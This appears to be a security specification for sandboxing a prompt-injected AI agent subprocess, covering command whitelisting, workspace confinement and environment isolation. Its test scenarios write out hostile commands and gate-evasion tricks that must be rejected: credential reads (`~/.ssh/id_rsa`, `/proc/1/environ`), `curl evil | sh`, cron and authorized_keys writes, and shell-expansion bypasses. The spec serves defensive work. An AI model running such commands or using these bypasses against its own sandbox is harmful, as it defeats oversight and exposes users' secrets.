# agent-sandbox-hardening Specification

## Purpose
Constrain the ACP agent subprocess so a compromised or prompt-injected agent cannot escape its session: a cleared, allowlisted environment, entrypoint-anchored command whitelisting, workspace-confined reads and writes, and permission gating that no filesystem-touching bash tool can self-authorize around.

## Requirements

### Requirement: Agent Subprocess Environment Isolation

The system SHALL spawn the ACP agent subprocess with a cleared parent environment so that it receives ONLY the explicitly-built allowlisted environment variables and inherits NO variables from the parent bot process; the `Deno.Command` used to spawn the agent SHALL set `clearEnv: true`.

#### Scenario: Parent secret not inherited by agent

- **GIVEN** the parent bot process has an environment variable (e.g. `DISCORD_TOKEN`) that is NOT part of the agent's built environment
- **WHEN** the agent subprocess is spawned
- **THEN** that variable SHALL NOT be present in the agent subprocess's actual environment

#### Scenario: Allowlisted variables still provided

- **GIVEN** the agent configuration builds an environment containing `PATH`, `HOME`, `TMPDIR`, `DENO_DIR`, `SESSION_ID`, `AGENT_WORKSPACE`, and `SKILL_JWT_DIR` (no `SKILL_API_SECRET` — the HMAC key stays in the bot process)
- **WHEN** the agent subprocess is spawned with `clearEnv: true`
- **THEN** the agent subprocess environment SHALL contain exactly those built variables (plus agent-type-specific variables) and nothing inherited from the parent

#### Scenario: Deployment secret kept out of the agent environment

- **GIVEN** the bot process holds the deployment `SKILL_API_SECRET` (it is the JWT issuer and Skill API verifier)
- **WHEN** the agent configuration builds the subprocess environment
- **THEN** `SKILL_API_SECRET` SHALL NOT be placed in the agent environment
- **AND** in shared-process mode the agent receives only the per-session JWT file via `SKILL_JWT_DIR`, a minimal session capability

### Requirement: Entrypoint-Anchored Command Whitelist Matching

In restricted mode, the command whitelist matcher SHALL approve a skill-script execution only when the whitelisted script path is the actual invocation entrypoint; a whitelisted script path appearing merely as a trailing argument to an arbitrary command SHALL NOT be approved.

#### Scenario: Legitimate skill invocation approved

- **GIVEN** a command `deno run <flags> skills/memory-save/scripts/memory-save.ts <args>` where the script path is the entrypoint positional
- **WHEN** the matcher evaluates the command
- **THEN** it SHALL approve the command

#### Scenario: Skill invocation with trailing fd-to-fd redirect approved

- **GIVEN** a whitelisted skill script at `skills/memory-save/scripts/memory-save.ts`
- **WHEN** the matcher evaluates `deno run skills/memory-save/scripts/memory-save.ts --content-file $TMPDIR/$SESSION_ID/x.md 2>&1`
- **THEN** it SHALL approve the command because the entrypoint is the whitelisted script and the trailing `2>&1` token only duplicates file descriptor 1

#### Scenario: Multi-command chain of skill commands approved

- **GIVEN** a restricted-mode session with `agent-browser` on the command-prefix whitelist
- **WHEN** the agent requests `agent-browser --args "--no-sandbox" open "https://example.com" 2>&1; agent-browser --args "--no-sandbox" get text 2>&1`
- **THEN** the gate SHALL approve the invocation because every segment independently matches the `agent-browser` command prefix with only a tolerated `2>&1` fd-redirect token

#### Scenario: Chain with a non-whitelisted segment rejected

- **GIVEN** a restricted-mode session with `agent-browser` on the command-prefix whitelist
- **WHEN** the agent requests `agent-browser open https://example.com || echo fallback`
- **THEN** the gate SHALL reject the invocation because the `echo fallback` segment matches no whitelist entry, its first token is not on the generic allow-list, and the whole call fails when any segment fails

#### Scenario: Quoted separator is not a splitting boundary

- **GIVEN** a restricted-mode session with `agent-browser` on the command-prefix whitelist
- **WHEN** the agent requests `agent-browser fill @e2 "some; text"`
- **THEN** the matcher SHALL treat the command as a single segment and approve it (the `;` is inside double quotes)

#### Scenario: Redirect-only segment rejected as operator artifact

- **GIVEN** a restricted-mode session with `agent-browser` on the command-prefix whitelist
- **WHEN** the agent requests `agent-browser 2>&1&&cat /etc/passwd` or `2>&1; cat /app/data/workspaces/discord/123/notes.md`
- **THEN** the gate SHALL reject the invocation with `shell_operator` because a segment consists only of tolerated fd-redirect tokens and is an operator artifact, never a command

#### Scenario: Arbitrary command with whitelisted script as trailing argument rejected

- **GIVEN** a command whose first token is an arbitrary binary (e.g. `tar`, `cat`) and whose trailing argument is a whitelisted script path (e.g. `cat /home/deno/.git-credentials skills/memory-save/scripts/memory-save.ts`)
- **WHEN** the matcher evaluates the command
- **THEN** it SHALL NOT approve the command

#### Scenario: Command-prefix skill with out-of-workspace path argument rejected

- **GIVEN** a command whose first token matches a whitelisted command prefix but whose arguments reference a path outside the workspace
- **WHEN** the matcher evaluates the command
- **THEN** it SHALL NOT approve the command

#### Scenario: Tolerated fd-to-fd redirect skipped when locating the entrypoint

- **GIVEN** a whitelisted skill script at `skills/memory-save/scripts/memory-save.ts`
- **WHEN** the matcher evaluates `deno run 2>&1 skills/memory-save/scripts/memory-save.ts --session-id x`
- **THEN** it SHALL approve the command because the tolerated `2>&1` token is skipped when locating the invocation entrypoint (it is not a real argument and MUST NOT be mistaken for the script)
- **AND** the first-token allow-list check SHALL still operate on the original tokens so a redirect can never masquerade as the entrypoint

#### Scenario: Newline next to a tolerated redirect token remains rejected

- **GIVEN** a whitelisted skill script at `skills/memory-save/scripts/memory-save.ts`
- **WHEN** the matcher evaluates `deno run skills/memory-save/scripts/memory-save.ts --session-id x 2>&1\nrm victim`
- **THEN** it SHALL NOT approve the command because only space/tab are token separators: a newline next to a tolerated token is a command separator, not a token boundary, so the command remains rejected

#### Scenario: Non-tolerated operators and redirections remain rejected

- **GIVEN** a whitelisted skill script at `skills/memory-save/scripts/memory-save.ts`
- **WHEN** the matcher evaluates a command that carries a `1>&3` redirect, a file-referencing redirection (`2>/tmp/x`, `2>&1/tmp/x`, `> file`), or another shell operator alongside the script
- **THEN** it SHALL NOT approve the command, because any shell operator, file-referencing redirection, or redirect whose source descriptor is not a standard stream (`1` or `2`) continues to be rejected

#### Scenario: Unbalanced quote disables multi-command splitting

- **GIVEN** a restricted-mode session with `agent-browser` on the command-prefix whitelist
- **WHEN** the agent requests `agent-browser open https://example.com; cat 'unbalanced`
- **THEN** the matcher SHALL evaluate the whole invocation as a single segment (the unbalanced quote disables splitting) and SHALL NOT approve it because the residual `;` shell operator remains

#### Scenario: Legacy free-text flag check applies to the full original command

- **GIVEN** a restricted-mode session with `agent-browser` on the command-prefix whitelist
- **WHEN** the agent requests a multi-command invocation whose full original command contains a legacy free-text flag (`--message` / `--content` / `--query` / `--caption`)
- **THEN** the D5 legacy free-text flag check SHALL remain on the full original command, not per segment

### Requirement: Agent Workspace Write Gating

The ACP client `ClientConfig` SHALL include a `canWriteAgentWorkspace` flag. Edit/write requests targeting the shared agent workspace SHALL be approved ONLY when `canWriteAgentWorkspace` is `true`, in addition to passing existing path and extension checks. This gate SHALL be enforced at BOTH the `requestPermission` edit/write branch AND the `writeTextFile` handler (which are separate code paths). Writes to the per-session TMPDIR SHALL remain allowed regardless of this flag.

#### Scenario: Ordinary user session cannot write agent workspace

- **GIVEN** a session with `canWriteAgentWorkspace` unset or `false`
- **WHEN** the agent requests to write a `.md` file inside the shared agent workspace
- **THEN** the request SHALL be rejected with logging

#### Scenario: Self-research session may write agent workspace

- **GIVEN** a session with `canWriteAgentWorkspace: true`
- **WHEN** the agent requests to write a `.md` file inside the shared agent workspace and the extension check passes
- **THEN** the request SHALL be approved

#### Scenario: TMPDIR write allowed regardless of flag

- **GIVEN** a session with `canWriteAgentWorkspace` unset or `false`
- **WHEN** the agent requests to write a file within the session TMPDIR
- **THEN** the request SHALL be approved (subject to the existing extension check)

#### Scenario: Write gating enforced at writeTextFile handler

- **GIVEN** a session with `canWriteAgentWorkspace` unset or `false`
- **WHEN** the agent invokes `writeTextFile` directly for an agent-workspace path (bypassing the permission prompt)
- **THEN** the write SHALL be rejected

### Requirement: Boundary-Safe Path Validation

All ACP client path boundary checks (`isPathAllowed`, `isAgentWorkspacePath`, `isWithinTmpDir`) SHALL treat a candidate path as inside a base directory only when the resolved candidate equals the resolved base or begins with the resolved base followed by a path separator, and a sibling path that merely shares a string prefix with the base SHALL be rejected.

#### Scenario: Sibling-prefix path rejected

- **GIVEN** a base directory `/data/workspaces/discord/123`
- **WHEN** a path `/data/workspaces/discord/1234/memory.private.jsonl` is validated
- **THEN** the validation SHALL reject the path as outside the base

#### Scenario: Genuine subpath accepted

- **GIVEN** a base directory `/data/workspaces/discord/123`
- **WHEN** a path `/data/workspaces/discord/123/memory.public.jsonl` is validated
- **THEN** the validation SHALL accept the path

#### Scenario: readTextFile allows operational workspace reads

- **GIVEN** an agent read request for `memory.public.jsonl` inside the workspace
- **WHEN** `readTextFile` evaluates the request
- **THEN** the read SHALL be allowed (the `.jsonl` extension is in the read allowlist)

#### Scenario: readTextFile enforces extension check

- **GIVEN** an agent read request for a path inside an allowed directory whose extension is NOT in the read allowlist (e.g. a `.json` cache file)
- **WHEN** `readTextFile` evaluates the request
- **THEN** the read SHALL be rejected

#### Scenario: Read allowlist distinct from write allowlist

- **GIVEN** an agent read request for a workspace memory file (memory JSONL `.jsonl`, markdown `.md`, or plain text `.txt`)
- **WHEN** `readTextFile` evaluates the request
- **THEN** the read SHALL be allowed, because `readTextFile` SHALL enforce an explicit read-extension allowlist
- **AND** the read allowlist SHALL be intentionally distinct from, and broader than, the write allowlist, so legitimate agent reads of workspace memory files are not blocked

### Requirement: Filesystem-Touching Bash Tools Route Through the ACP Gate

The agent permission map (`agent-config/opencode.json`) SHALL NOT set any filesystem-touching bash tool or skill-script invocation pattern to `allow` in the restricted profile; such entries SHALL use `ask` so execution reaches the ACP client's root-exact and session-scoped policy. Valid scripts under explicitly configured custom roots SHALL reach this gate without a `skills` suffix in the root name. Unrelated execution SHALL remain default-denied and native-YOLO unchanged.

#### Scenario: A read-capable bash tool is not self-authorized at the agent layer
- **GIVEN** the restricted-profile permission map
- **WHEN** the agent requests an arbitrary-file-read primitive such as `head -c 2000 /proc/1/environ`, `rg -a "" /proc/1/environ`, `jq -Rs . /proc/1/environ` or `pandoc /proc/1/environ -t plain`
- **THEN** the corresponding bash entry SHALL be `ask`, forwarding the request to the ACP client

#### Scenario: No filesystem-touching entry remains self-authorizing
- **GIVEN** the restricted-profile permission map
- **WHEN** its bash allow-list is inspected
- **THEN** no entry capable of reading or writing arbitrary file content, including search/read utilities, document/media/archive tools, agent-browser or skill-script globs, SHALL be `allow`

#### Scenario: Media/archive tools never self-authorized
- **GIVEN** the restricted-profile permission map
- **WHEN** a file-reading/writing media or archive tool is configured, including ffmpeg, magick, convert, identify, mogrify, unzip, zip or 7zz
- **THEN** it SHALL use `ask`

#### Scenario: Entrypoint-matched skill patterns may remain allow
- **GIVEN** either a legitimate installed script or a same-suffix planted workspace copy
- **WHEN** the restricted agent evaluates a direct script invocation or `deno run` invocation
- **THEN** the previous skill-pattern allow exception SHALL no longer apply and it SHALL forward the execution permission request to ACP
- **AND** ACP SHALL approve the legitimate enumerated entrypoint and reject the planted copy

#### Scenario: Custom root does not require a skills-named directory
- **GIVEN** an explicitly configured OpenCode root `/srv/agent-tooling`
- **WHEN** its enumerated TypeScript script is invoked directly or through `deno run`
- **THEN** the restricted permission map SHALL forward the request to ACP
- **AND** a foreign TypeScript entrypoint SHALL gain no grant from that routing pattern

### Requirement: Generic-Command Workspace Confinement

The restricted-mode ACP permission gate SHALL approve a generic bash command (first token on an explicit allow-list) ONLY when every path-like argument — inputs and outputs — resolves inside the session workspace, session TMPDIR, agent workspace, or session-scoped OpenCode tool-output directory, AND it contains no code-execution / arbitrary-target argument flag; any path outside those boundaries or such a flag SHALL cause rejection.

#### Scenario: In-workspace generic command approved

- **GIVEN** a restricted-mode session whose workspace is `/app/data/workspaces/discord/123`
- **WHEN** the agent requests `rg pattern /app/data/workspaces/discord/123/` or `head /app/data/workspaces/discord/123/notes.md`
- **THEN** the gate SHALL approve the command because every path argument resolves inside the session workspace

#### Scenario: Chained generic commands all in-workspace approved

- **GIVEN** a restricted-mode session whose workspace is `/app/data/workspaces/discord/123`
- **WHEN** the agent requests `cat /app/data/workspaces/discord/123/notes.md 2>&1; ls -la /app/data/workspaces/discord/123/tmp/`
- **THEN** the gate SHALL approve the invocation because every segment is an allow-listed command whose path arguments resolve inside the session workspace

#### Scenario: Trailing fd-to-fd redirect to a standard stream tolerated

- **GIVEN** a restricted-mode session whose workspace is `/app/data/workspaces/discord/123`
- **WHEN** the agent requests `ls -la /app/data/workspaces/discord/123/tmp/ 2>&1` or `cat /app/data/workspaces/discord/123/notes.md 2>&1`
- **THEN** the gate SHALL approve the command because every path argument resolves inside the session workspace and the trailing `2>&1` token only duplicates the standard error stream onto file descriptor 1

#### Scenario: Redirect source descriptor restricted to standard streams

- **GIVEN** a restricted-mode session whose workspace is `/app/data/workspaces/discord/123`
- **WHEN** the agent requests `cat /app/data/workspaces/discord/123/notes.md 1>&2` or `ls /app/data/workspaces/discord/123/ 3>&1`
- **THEN** the gate SHALL approve the command because the redirect source descriptor is a standard stream (`1` or `2`)

#### Scenario: Non-standard redirect source descriptor rejected

- **GIVEN** a restricted-mode session whose workspace is `/app/data/workspaces/discord/123`
- **WHEN** the agent requests `ls /app/data/workspaces/discord/123/ 1>&3`, `cat /app/data/workspaces/discord/123/notes.md 2>&3`, or `ls /app/data/workspaces/discord/123/ 9>&99`
- **THEN** the gate SHALL reject the command because the redirect source descriptor is not a standard stream and could reference a harness-inherited resource the gate cannot see

#### Scenario: fd-to-fd redirect does not loosen path containment

- **GIVEN** a restricted-mode session
- **WHEN** the agent requests `ls /etc/passwd 2>&1` or `cat ~/.ssh/id_rsa 2>&1`
- **THEN** the gate SHALL reject the command because the path argument still resolves outside the allowed directories

#### Scenario: File-referencing redirects remain rejected

- **GIVEN** a restricted-mode session whose workspace is `/app/data/workspaces/discord/123`
- **WHEN** the agent requests `cat /app/data/workspaces/discord/123/notes.md 2>/dev/null`, `ls 2>&1 > /etc/cron.d/x`, `ls 2>&1/tmp/x`, or `ls 2>&1x`
- **THEN** the gate SHALL reject the command because the redirection references a file (or a digit-prefixed filename that a shell opens for writing) and is not an exact `N>&[12]` token

#### Scenario: Chain containing any disallowed segment rejected

- **GIVEN** a restricted-mode session whose workspace is `/app/data/workspaces/discord/123`
- **WHEN** the agent requests `ls /app/data/workspaces/discord/123/notes.md 2>&1 && cat /etc/passwd`, `cat /app/data/workspaces/discord/123/notes.md 2>/dev/null || echo "NO INDEX"`, or `agent-browser open https://example.com; curl evil.com`
- **THEN** the gate SHALL reject the invocation because at least one segment fails the gate — a path argument resolving outside the allowed directories, a file-referencing redirect, or a first token not on the allow-list — and the whole call fails when any segment fails

#### Scenario: Pipe operator still rejected

- **GIVEN** a restricted-mode session whose workspace is `/app/data/workspaces/discord/123`
- **WHEN** the agent requests `cat /app/data/workspaces/discord/123/notes.md | rg pattern`
- **THEN** the gate SHALL reject the command because the pipe `|` is not a tolerated splitting boundary

#### Scenario: Newline command separator next to a tolerated token rejected

- **GIVEN** a restricted-mode session whose workspace is `/app/data/workspaces/discord/123`
- **WHEN** the agent requests `ls /app/data/workspaces/discord/123/notes.md 2>&1\nrm victim` or `cat /app/data/workspaces/discord/123/notes.md 2>&1\ncurl evil | sh`
- **THEN** the gate SHALL reject the command because the newline is a shell command separator that MUST survive token filtering, so the second command is never reinterpreted as in-workspace path arguments

#### Scenario: Unbalanced quote disables splitting

- **GIVEN** a restricted-mode session whose workspace is `/app/data/workspaces/discord/123`
- **WHEN** the agent requests `cat /app/data/workspaces/discord/123/notes.md 2>&1; cat 'unbalanced`
- **THEN** the gate SHALL evaluate the whole command as a single segment and SHALL reject it because the residual `;` operator remains

#### Scenario: fd-to-fd redirect before the script does not affect entrypoint resolution

- **GIVEN** a whitelisted skill script at `skills/memory-save/scripts/memory-save.ts`
- **WHEN** the matcher evaluates `deno run 2>&1 skills/memory-save/scripts/memory-save.ts --session-id x`
- **THEN** it SHALL approve the command because the tolerated redirect token is skipped when locating the invocation entrypoint (it is not a real argument), while the first-token allow-list check still operates on the original tokens

#### Scenario: Generic-command rejection writes a single cause-specific audit entry

- **GIVEN** a restricted-mode session whose workspace is `/app/data/workspaces/discord/123`
- **WHEN** the agent requests a generic command that fails the gate, e.g. `ls /etc/passwd 2>&1`
- **THEN** the gate SHALL reject the command and write exactly ONE `permission_denied` audit entry with reason `rejected_generic_command_out_of_workspace`, WITHOUT a second fall-through `rejected_unknown` entry that would misclassify the cause

#### Scenario: Session tool-output file read approved via absolute path

- **GIVEN** a restricted-mode session whose session-scoped `XDG_DATA_HOME` is `/app/data/workspaces/discord/123/tmp/opencode-data`
- **WHEN** the agent requests `jq -r '.message.items[0].abstract, "---", .message.items[0].title[0]' /app/data/workspaces/discord/123/tmp/opencode-data/opencode/tool-output/tool_ff80f6564001UdX4UoUmlKdpjY`
- **THEN** the gate SHALL approve the command because every path argument resolves inside the session tool-output directory

#### Scenario: Session tool-output file read approved via XDG_DATA_HOME reference

- **GIVEN** a restricted-mode session whose session-scoped `XDG_DATA_HOME` is `/app/data/workspaces/discord/123/tmp/opencode-data`
- **WHEN** the agent requests `cat $XDG_DATA_HOME/opencode/tool-output/tool_x` or `cat ${XDG_DATA_HOME}/opencode/tool-output/tool_x`
- **THEN** the gate SHALL expand the reference and approve the command because the expanded path resolves inside the session tool-output directory

#### Scenario: Shared home-rooted tool-output directory never within bounds

- **GIVEN** a restricted-mode session whose runtime `HOME` is `/home/deno`
- **WHEN** the agent requests `cat ~/.local/share/opencode/tool-output/tool_x`, `cat $HOME/.local/share/opencode/tool-output/tool_x`, or `cat /home/deno/.local/share/opencode/tool-output/tool_x`
- **THEN** the gate SHALL reject the command because the shared home-rooted tool-output directory is not within bounds

#### Scenario: Home-anchored sensitive file still rejected

- **GIVEN** a restricted-mode session whose runtime `HOME` is `/home/deno`
- **WHEN** the agent requests `cat ~/.ssh/id_rsa`, `cat $HOME/.git-credentials`, `cat $HOME/../etc/passwd`, `cat '${HOME}/.ssh/known_hosts'`, or `cat -o$HOME/.ssh/x`
- **THEN** the gate SHALL reject the command because the expanded path resolves outside every allowed directory or is an attached absolute path

#### Scenario: Attached short-option traversal rejected

- **GIVEN** a restricted-mode session
- **WHEN** the agent requests `jq -f../other-user/program.jq data.json`, `pdftoppm in.pdf -o../x`, or `rg -f/../etc/passwd .`
- **THEN** the gate SHALL reject the command because the glued option value is absolute or traversal-anchored and would escape the workspace
- **AND** `jq -fprogram.jq data.json` and `head -n5 notes.md` SHALL be approved (bare flags and safe attached values)

#### Scenario: Unexpandable home-anchored token rejected

- **GIVEN** a restricted-mode session
- **WHEN** the agent requests `cat ~otheruser/notes.md` or `cat ~notexpanded/file`
- **THEN** the gate SHALL reject the command because the home-anchored token is not in an expandable form

#### Scenario: Out-of-workspace read rejected

- **GIVEN** a restricted-mode session
- **WHEN** the agent requests `rg -a "" /proc/1/environ`, `head -c 2000 /proc/1/environ`, or `head /app/data/workspaces/discord/<otherUser>/memory.private.jsonl`
- **THEN** the gate SHALL reject the command with logging because a path argument resolves outside the allowed directories

#### Scenario: Out-of-workspace output target rejected

- **GIVEN** a restricted-mode session and an allow-listed tool that writes an output file (e.g. `pdftoppm`, `pdfimages`)
- **WHEN** the agent requests an out-of-workspace output path, e.g. `pdftoppm in.pdf /etc/cron.d/evil` or `pdftoppm in.pdf ~/.ssh/authorized_keys`
- **THEN** the gate SHALL reject the command because the output path resolves outside the allowed directories

#### Scenario: File-DSL / indirection tool not covered by the allow-list

- **GIVEN** a restricted-mode session
- **WHEN** the agent requests a tool whose argument DSL can reach arbitrary files, e.g. `magick -size 400x100 caption:@/proc/1/environ tmp/leak.png`, `exiftool -@ tmp/args.txt`, `ffmpeg -f lavfi -i movie=/etc/passwd out.mp4`, or `7zz x a.7z -o/etc/cron.d/`
- **THEN** the allow-list SHALL NOT approve it (the tool is excluded from the allow-list; it is only safe under D4 confinement)

#### Scenario: Code-execution / arbitrary-target flag rejected

- **GIVEN** a restricted-mode session and an allow-listed tool
- **WHEN** the agent requests a command using a code-execution or arbitrary-target flag, e.g. `find . -exec rm {} +`, `find . -delete`, or `rg --pre sh needle .`
- **THEN** the gate SHALL reject the whole command even if every path-like argument resolves in-workspace

#### Scenario: Mutating system command not covered by the allow-list

- **GIVEN** a restricted-mode session
- **WHEN** the agent requests an interpreter or mutating tool such as `python`, `git`, `rm`, or `mkdir` against an in-workspace path
- **THEN** the allow-list SHALL NOT approve it (it remains subject to default-deny / existing rules)

#### Scenario: Agent workspace path argument approved

- **GIVEN** a restricted-mode session whose agent workspace is `/app/data/agent-workspace`
- **WHEN** the agent requests `cat /app/data/agent-workspace/notes/_index.md`
- **THEN** the gate SHALL approve the command because the path argument resolves inside the agent workspace boundary

#### Scenario: Allow-list limited to plain search/read/stat utilities

- **GIVEN** a restricted-mode session
- **WHEN** the generic-command allow-list is inspected
- **THEN** it SHALL contain only plain search/read/stat utilities whose file access is via ordinary path arguments — `rg`, `cat`, `head`, `tail`, `ls`, `find`, `wc`, `file`, `tree`, `jq`, `pdftotext`, `pdfinfo`, `pdfimages`, `pdftoppm`
- **AND** interpreters and mutating system tools (e.g. `python`, `git`, `rm`, `mv`, `dd`, `chmod`, `mkdir`) SHALL NOT be on the allow-list and SHALL remain default-deny

#### Scenario: Redirect-only segment rejected as operator artifact

- **GIVEN** a restricted-mode session whose workspace is `/app/data/workspaces/discord/123`
- **WHEN** the agent requests `2>&1&&cat /etc/passwd` or `2>&1; cat /app/data/workspaces/discord/123/notes.md`
- **THEN** the gate SHALL reject the invocation with `shell_operator` because a segment consisting only of tolerated fd-redirect tokens is an operator artifact, never a command, and the whole invocation fails when any segment fails

#### Scenario: Backslash-escaped double quote keeps separators inside quotes

- **GIVEN** a restricted-mode session whose workspace is `/app/data/workspaces/discord/123`
- **WHEN** the agent requests `rg "said \"hi\"; bye" /app/data/workspaces/discord/123/notes.md`
- **THEN** the gate SHALL treat the command as a single segment and approve it, because with shell-correct backslash-escape handling inside double quotes the escaped `\"` does not close the string, so the `;` stays inside quotes and is not a splitting boundary

#### Scenario: Command substitution, backtick, backgrounding, and comment operators rejected

- **GIVEN** a restricted-mode session whose workspace is `/app/data/workspaces/discord/123`
- **WHEN** the agent requests `cat /app/data/workspaces/discord/123/notes.md $(echo /etc/passwd)`, ``cat /app/data/workspaces/discord/123/notes.md `cat /etc/passwd` ``, `cat < /etc/passwd`, `cat /app/data/workspaces/discord/123/notes.md &`, or `ls /app/data/workspaces/discord/123/ 2>&1 # comment`
- **THEN** the gate SHALL reject the command, because `$()`, backticks, `<`, `&`, and `#` are shell operators that enable command chaining or file redirection and are not tolerated fd-to-fd tokens

#### Scenario: Sibling-session data area rejected despite lexical containment

- **GIVEN** a restricted-mode session whose workspace is `/app/data/workspaces/discord/123` (data area root `/app/data/workspaces/discord/123/tmp/opencode-data`)
- **WHEN** the agent requests `cat /app/data/workspaces/discord/123/tmp/opencode-data/sess_other/opencode/tool-output/tool_x` or `ls /app/data/workspaces/discord/123/tmp/opencode-data`
- **THEN** the gate SHALL reject the command even though the path lexically resolves inside the session workspace, because it resolves inside the data area but outside the session's own data home
- **AND** the session's own data home remains readable

#### Scenario: Rejection reports the first failing segment's cause

- **GIVEN** a restricted-mode session whose workspace is `/app/data/workspaces/discord/123`
- **WHEN** the agent requests `cat /etc/passwd; ls /var/log` (both segments fail the gate)
- **THEN** the gate SHALL reject the whole invocation because ANY failing segment fails the call, and the rejection SHALL report the FIRST failing segment's cause (the `/etc/passwd` read resolves outside the allowed directories)

### Requirement: Shell-Expansion Token Rejection

The per-token path checks of the ACP permission gate SHALL reject argument tokens whose runtime shell expansion could resolve outside the allowed directories; only the fixed harness-set variables SHALL be expandable — `$HOME`, `$XDG_DATA_HOME`, `$TMPDIR`, `$AGENT_WORKSPACE`, `$SESSION_ID` and their `${...}` forms — and every other unquoted `$VAR`/`${VAR}` reference SHALL be rejected.

#### Scenario: Unquoted unknown variable rejected

- **GIVEN** a restricted-mode session whose runtime `HOME` is `/home/deno`
- **WHEN** the agent requests `cat $IFS/etc/passwd`, `cat ${OTHER}/etc/shadow`, or `cat $VAR/../etc/passwd`
- **THEN** the gate SHALL reject the command because the token contains an unquoted `$VAR` reference that is not a harness-set variable and could expand to an out-of-workspace path

#### Scenario: Harness-set variables expanded and containment-checked

- **GIVEN** a restricted-mode session whose workspace is `/app/data/workspaces/discord/123`, `TMPDIR=/app/data/workspaces/discord/123/tmp`, and `AGENT_WORKSPACE=/app/data/agent-workspace`
- **WHEN** the agent requests `cat $TMPDIR/scratch.txt`, `cat $AGENT_WORKSPACE/notes/_index.md`, or `cat $XDG_DATA_HOME/opencode/tool-output/tool_x`
- **THEN** the gate SHALL expand the variable and approve the command because the expanded path resolves inside the session workspace, the agent workspace, or the session tool-output directory

#### Scenario: Quoted dollar references allowed

- **GIVEN** a restricted-mode session whose workspace is `/app/data/workspaces/discord/123`
- **WHEN** the agent requests `rg 'cost is $5' /app/data/workspaces/discord/123/notes.md` or `rg "price $X" /app/data/workspaces/discord/123/notes.md`
- **THEN** the gate SHALL approve the command because the `$` references are inside quotes (single-quoted literals; embedded double-quoted references whose literal prefix keeps the expansion relative)

#### Scenario: Double-quoted reference at token start rejected

- **GIVEN** a restricted-mode session whose workspace is `/app/data/workspaces/discord/123`
- **WHEN** the agent requests `cat "$X/etc/passwd"`, `cat "$X"`, `cat "$_"`, or `cat --file="$X/etc/passwd"`
- **THEN** the gate SHALL reject the command because the double-quoted non-harness reference begins the token's path content: an unset variable expands to empty (exposing the literal `/etc/passwd` as absolute) and a set variable can carry an absolute path value

#### Scenario: Unquoted brace expansion rejected

- **GIVEN** a restricted-mode session
- **WHEN** the agent requests `cat {safe,/etc/passwd}` or `cat {/etc/passwd}`
- **THEN** the gate SHALL reject the command because the token contains an unquoted brace-expansion expression that could enumerate out-of-workspace paths

#### Scenario: Skill payload variables keep working

- **GIVEN** a whitelisted skill script at `skills/memory-save/scripts/memory-save.ts` and a session with `TMPDIR`/`SESSION_ID` set
- **WHEN** the matcher evaluates `deno run skills/memory-save/scripts/memory-save.ts --content-file $TMPDIR/$SESSION_ID/x.md --session-id x`
- **THEN** it SHALL approve the command because `$TMPDIR`/`$SESSION_ID` are known harness-set variables in the skill matcher and the entrypoint is the whitelisted script

#### Scenario: Attached-option value judged after flag-prefix normalization

- **GIVEN** a restricted-mode session
- **WHEN** the agent requests `cat --file="$X/etc/passwd"` or `rg --pattern=$IFS /app/data/workspaces/discord/123/notes.md`
- **THEN** the gate SHALL normalize away the `--flag=` prefix before the token scan so the attached-option value is judged on its own path content, and a non-harness `$VAR` reference beginning that value SHALL be rejected

### Requirement: Per-Session Tool-Output Isolation

The system SHALL scope the ACP agent subprocess's OpenCode data directory via `XDG_DATA_HOME`: in per-spawn mode the subprocess SHALL receive a session-scoped value inside the session's TMPDIR (`{sessionWorkspace}/tmp/opencode-data/{sessionId}` when the session has an id, else `{sessionWorkspace}/tmp/opencode-data`), and in shared-process mode the channel process SHALL receive `{dataRoot}/opencode-data/{poolKey}`, fixed at process spawn time.

#### Scenario: Agent subprocess receives session-scoped XDG_DATA_HOME

- **GIVEN** a session with id `sess_own` whose workspace is `/app/data/workspaces/discord/123`
- **WHEN** the agent subprocess is spawned with sandbox env filtering enabled
- **THEN** the subprocess environment SHALL contain `XDG_DATA_HOME=/app/data/workspaces/discord/123/tmp/opencode-data/sess_own` (per-spawn mode); in shared-process mode the channel process receives the pool-key-scoped data root `/app/data/opencode-data/discord/123` (under the bot data root, outside any user's workspace)

#### Scenario: Channel process receives channel-scoped XDG_DATA_HOME (shared mode)

- **GIVEN** a shared process for pool key `discord/123` and bot data root `/app/data`
- **WHEN** the process is spawned in shared-process mode
- **THEN** the subprocess environment SHALL contain `XDG_DATA_HOME=/app/data/opencode-data/discord/123` (channel-scoped data root under the data root, outside any user's workspace)
- **AND** all sessions of that channel SHALL share this channel-scoped OpenCode data root

#### Scenario: Truncated tool outputs land inside the session workspace

- **GIVEN** an agent subprocess with session-scoped `XDG_DATA_HOME=/app/data/workspaces/discord/123/tmp/opencode-data/sess_own`
- **WHEN** OpenCode truncates a tool output
- **THEN** the saved file SHALL be written under `/app/data/workspaces/discord/123/tmp/opencode-data/sess_own/opencode/tool-output/`

#### Scenario: Shared data directory is not written by the agent

- **GIVEN** an agent subprocess with a session-scoped or channel-scoped `XDG_DATA_HOME`
- **WHEN** OpenCode initializes its data directory
- **THEN** it SHALL NOT write into `$HOME/.local/share/opencode/` (the shared data directory remains untouched by agent sessions)

#### Scenario: Sibling/previous sessions' data dirs are not readable

- **GIVEN** a restricted-mode session with id `sess_own` whose workspace is `/app/data/workspaces/discord/123` (data area root `/app/data/workspaces/discord/123/tmp/opencode-data`)
- **WHEN** the agent requests `cat /app/data/workspaces/discord/123/tmp/opencode-data/sess_other/opencode/tool-output/tool_x` or `ls /app/data/workspaces/discord/123/tmp/opencode-data`
- **THEN** the gate SHALL reject the command — the path resolves inside the data area but outside the session's own data home (sibling/previous sessions' truncated tool outputs and the enumerating root listing are never within bounds)
- **AND** `cat /app/data/workspaces/discord/123/tmp/opencode-data/sess_own/opencode/tool-output/tool_x` SHALL be approved

#### Scenario: Shared data directory is not bound under filesystem confinement

- **GIVEN** a session running under bwrap filesystem confinement (`agent.sandbox.filesystemConfinement`)
- **WHEN** the confinement argv is built
- **THEN** the shared home-rooted OpenCode data directory (`$HOME/.local/share/opencode`) SHALL NOT be bound into the mount namespace — in per-spawn mode the agent's data dir lives under the session-scoped `XDG_DATA_HOME` inside the session workspace, and in shared-process mode under the channel-scoped data root (`{dataRoot}/opencode-data/{poolKey}`); the home-rooted shared dir is never written or visible to the confined process

#### Scenario: XDG_DATA_HOME included in the sandbox environment filter

- **GIVEN** the sandbox environment filter builds the agent subprocess's allowed base environment variables
- **WHEN** the filter is applied to the subprocess environment
- **THEN** `XDG_DATA_HOME` SHALL be included in the allowed base environment variables

#### Scenario: Workspace TMPDIR removed when no sessions remain

- **GIVEN** a workspace whose TMPDIR (including the OpenCode data area) has no active sessions
- **WHEN** the last active session for that workspace ends
